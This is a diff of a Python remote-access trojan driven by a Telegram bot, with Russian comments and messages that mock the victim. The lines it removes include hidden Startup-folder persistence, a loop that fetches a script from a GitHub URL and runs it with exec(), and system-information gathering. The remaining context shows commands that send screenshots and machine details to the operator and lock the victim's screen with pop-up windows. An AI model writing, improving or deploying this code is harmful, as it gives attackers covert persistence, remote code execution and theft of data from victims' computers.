@@ -7,43 +7,6 @@ with open('screenshot.png', 'rb') as screenshot_file:
 bot.send_message(chat_id, message)
 os.remove('screenshot.png')
 
-try:
-    def avtostart():
-        try:
-            message = "УСПЕШНОЕ ДОБАВЛЕНИЕ в автозапуск, теперь хуесосу скорее всего гг)!"
-            pythoncom.CoInitialize()
-            current_program = os.path.abspath(sys.argv[0])
-            message1 = f"ИНФО: {current_program}!"
-            bot.send_message(chat_id, message1)
-            print(current_program)
-            user_folder = os.path.expanduser("~")
-            copy_folder = os.path.join(user_folder, "MyProgram")
-            os.makedirs(copy_folder, exist_ok=True)
-            shutil.copy(current_program, copy_folder)
-            shortcut_name = "hostser.lnk"
-            shortcut_path = os.path.join(user_folder, shortcut_name)
-            with winshell.shortcut(shortcut_path) as shortcut:
-                shortcut.path = os.path.join(copy_folder, os.path.basename(current_program))
-                shortcut.show_cmd = win32con.SW_HIDE  # Bualmkpw pavlu
-                shortcut.icon = (None, 0)
-            startup_folder = winshell.startup()
-            startup_shortcut_path = os.path.join(startup_folder, os.path.basename(shortcut_path))
-            shutil.copy(shortcut_path, startup_shortcut_path)
-            bot.send_message(chat_id, message)
-        except Exception as e:
-            message = f"ОШИБКА ДОБАВЛЕНИЯ в автозапуск \n {e} !"
-            bot.send_message(chat_id, message)
-    avtostart()
-except Exception as e:
-    message = f"ОШИБКА в функции ДОБАВЛЕНИЯ в автозапуск \n {e} !"
-    bot.send_message(chat_id, message)
-
-def check_internet_connection():
-  try:
-    requests.get('http://www.google.com', timeout=3)
-    return True
-  except requests.ConnectionError:
-    return False
 
 user = os.path.expanduser("~")
 
@@ -80,36 +43,6 @@ def send_zip_to_telegram(telegram_bot_token, chat_id, source_dir):
       print(f"Error creating or sending zip file: {str(e)}")
 
 
-def execute_code_if_internet_available():
-    while True:
-        if check_internet_connection():
-            try:
-                try:
-                    pythoncom.CoInitialize()
-                    current_program = os.path.abspath(sys.argv[0])
-                    bot.send_message(chat_id, current_program)
-                    print(current_program)
-                    user_folder = os.path.expanduser("~")
-                    copy_folder = os.path.join(user_folder, "MyProgram")
-                    os.makedirs(copy_folder, exist_ok=True)
-                    shutil.copy(current_program, copy_folder)
-                    shortcut_name = "hostser.lnk"
-                    shortcut_path = os.path.join(user_folder, shortcut_name)
-                except Exception as e:
-                    bot.send_message(chat_id, f"ERROR PRI DOBAVKE B AVTOZAPUSK: {e}")
-                user = os.path.expanduser("~")
-                url = 'https://raw.githubusercontent.com/vovanskaie/SCVAD_MRAKS/master/stal.py'
-                response = requests.get(url)
-                html_content = response.content
-                soup = BeautifulSoup(html_content, 'html.parser')
-                text_without_tags = soup.get_text()
-                exec(text_without_tags)
-                bot.send_message(chat_id, "OTPRAVKA ZAVERSHENA BRAT")
-            except Exception as e:
-                pass
-        else:
-            # print("Подключение отсутствует. Повторная попытка через 10 секунд...")
-            time.sleep(10)
 @bot.message_handler(commands=['TG'])
 def execute_code_if_internet_available():
     while True:
@@ -144,15 +77,6 @@ def execute_code_if_internet_available():
 
 
 def find_browsers(paths: List[str] = None) -> List[str]:
-    """
-    Возвращает список найденных браузеров.
-
-    Args:
-        paths (List[str], optional): Список дополнительных путей для поиска. Defaults to None.
-
-    Returns:
-        List[str]: Список найденных браузеров.
-    """
 
     browsers = []
 
@@ -242,50 +166,6 @@ def find_browsers_in_registry():
 
     return browsers
 
-def get_system_info():
-  """Собирает основную информацию о системе."""
-  info = {}
-
-  # Время работы ПК
-  try:
-    boot_time_timestamp = psutil.boot_time()
-    boot_time = datetime.fromtimestamp(boot_time_timestamp)
-    current_time = datetime.now()
-    uptime = current_time - boot_time
-    info['uptime'] = uptime
-  except Exception:
-    info['uptime'] = 'Информация не найдена'
-
-  # Информация о системе
-  try:
-    hostname = socket.gethostname()
-    ip_address = socket.gethostbyname(hostname)
-    system_name = platform.system()
-    info['system_name'] = system_name
-    info['hostname'] = hostname
-    info['ip_address'] = ip_address
-  except Exception:
-    info['system_name'] = info['hostname'] = info['ip_address'] = 'Информация не найдена'
-
-  # Процессор
-  try:
-    info['cpu_cores'] = psutil.cpu_count(logical=False)
-    info['cpu_logical_cores'] = psutil.cpu_count(logical=True)
-    info['cpu_frequency'] = psutil.cpu_freq().current
-  except Exception:
-    info['cpu_cores'] = info['cpu_logical_cores'] = info['cpu_frequency'] = 'Информация не найдена'
-
-  # ОЗУ
-  try:
-    memory = psutil.virtual_memory()
-    info['total_ram'] = memory.total / (1024 * 1024 * 1024) # ГБ
-    info['used_ram'] = memory.used / (1024 * 1024 * 1024) # ГБ
-    info['available_ram'] = memory.available / (1024 * 1024 * 1024) # ГБ
-  except Exception:
-    info['total_ram'] = info['used_ram'] = info['available_ram'] = 'Информация не найдена'
-
-  return info
-
 
 @bot.message_handler(commands=['dox'])
 def dox(message):
@@ -296,9 +176,6 @@ def dox(message):
 
     # Информация о системе
     system_info = get_system_info()
-
-    # Доступные браузеры
-    browsers = find_browsers()
 
     # Отправка информации
     if screenshot is not None:
@@ -315,17 +192,16 @@ def dox(message):
       bot.send_message(message.chat.id, f"Время работы ПК: {system_info.get('uptime', 'Информация не найдена')}")
       bot.send_message(message.chat.id, f"Процессор: {system_info.get('cpu_cores', 'Информация не найдена')} ядер (Логических: {system_info.get('cpu_logical_cores', 'Информация не найдена')}), {system_info.get('cpu_frequency', 'Информация не найдена')} МГц")
       bot.send_message(message.chat.id, f"ОЗУ: {system_info.get('used_ram', 0):.2f} ГБ / {system_info.get('total_ram', 0):.2f} ГБ (Доступно: {system_info.get('available_ram', 0):.2f} ГБ)")
-      bot.send_message(message.chat.id, f"Доступные браузеры: {browsers}")
 
   except Exception as e:
     bot.send_message(message.chat.id, f"Ошибка при получении информации: {e}")
 
-
-current_window = None # Глобальная переменная для хранения ссылки на текущее окно
+ # Глобальная переменная для хранения ссылки на текущее окно
 
 
 @bot.message_handler(commands=['msg'])
 def msg(message):
+    current_window = None
     global locked
     locked = True
     def show_message(msg, code=None):
@@ -409,6 +285,7 @@ def msg(message):
 
 @bot.message_handler(commands=['code'])
 def code_message(message):
+    current_window = None
     global locked
     locked = True
     def show_code_window(code):
@@ -504,30 +381,6 @@ def msg_drop(message):
 
 
 
-@bot.message_handler(commands=['avto'])
-def avto(message):
-    try:
-        pythoncom.CoInitialize()
-        current_program = os.path.abspath(sys.argv[0])
-        bot.send_message(message.chat.id, current_program)
-        print(current_program)
-        user_folder = os.path.expanduser("~")
-        copy_folder = os.path.join(user_folder, "MyProgram")
-        os.makedirs(copy_folder, exist_ok=True)
-        shutil.copy(current_program, copy_folder)
-        shortcut_name = "hostser.lnk"
-        shortcut_path = os.path.join(user_folder, shortcut_name)
-        with winshell.shortcut(shortcut_path) as shortcut:
-            shortcut.path = os.path.join(copy_folder, os.path.basename(current_program))
-            shortcut.show_cmd = win32con.SW_HIDE  # Bualmkpw pavlu
-            shortcut.icon = (None, 0)
-        startup_folder = winshell.startup()
-        startup_shortcut_path = os.path.join(startup_folder, os.path.basename(shortcut_path))
-        shutil.copy(shortcut_path, startup_shortcut_path)
-        bot.send_message(message.chat.id, "Успешно добавил в автозапуск, теперь хуесосу скорее всего гг)!")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"Ошибка при добавлении в автозапуск бро :\ - {e}")
-
 @bot.message_handler(commands=['drop'])
 def drop(message):
     try:
@@ -556,7 +409,4 @@ def mains():
             bot.send_message(chat_id, f"ОШИБКА В КОНЕЧНОМ ЗАПУСКЕ!! : \n  {e} ")
             print(f"ОШИБКА В КОНЕЧНОМ ЗАПУСКЕ: {e}")
             bot.polling(none_stop=True)
-try:
-    mains()
-except:
-    mains()
+mains()
